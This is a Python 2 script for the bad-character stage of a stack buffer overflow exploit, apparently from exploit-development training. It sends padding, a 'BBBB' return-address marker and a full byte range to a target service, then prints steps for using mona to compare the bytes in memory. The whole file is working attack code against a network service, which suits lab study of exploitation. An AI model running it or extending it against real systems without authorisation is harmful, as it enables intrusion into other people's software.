#!/usr/bin/env python2

import socket
from constants import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

badchar_test = ""
badchars = [0x00, 0x0A]

for i in range(0x00, 0xFF+1):
    if i not in badchars:
        badchar_test += chr(i)

with open('bc.bin', 'wb') as f:
    f.write(badchar_test)

buf = ""
buf += "A"*(BUFFER_OFFSET - len(buf))
buf += "BBBB"
buf += badchar_test
buf += "D"*(BUFFER_TOTLEN - len(buf))
buf += "\r\n"

send_payload(s, buf)

print "Sent: {0}".format(buf)
print "Now transfer the generated bc.bin to the test machine for mona"
print "Look for the address on memory after BBBB - bad chars might start in the middle of address, so add 1-3 accordingly"
print "Transfer bc.bin to machine, and !mona compare -f C:\users\\administrator\desktop\\bc.bin -a ADDRESS_FROM_ABOVE"
print "or faster: !mona bytearray -b '\\x00\\x0a' and !mona compare -f bytearray.bin -a ADDRESS_FROM_ABOVE"
print "Mona will highlight bad char with 00 or -1 or b0 under it, also will list of corrupted characters  - sometimes initial list is inaccurate"
print "Then add bad character to the script and repeat until you get all chars back"

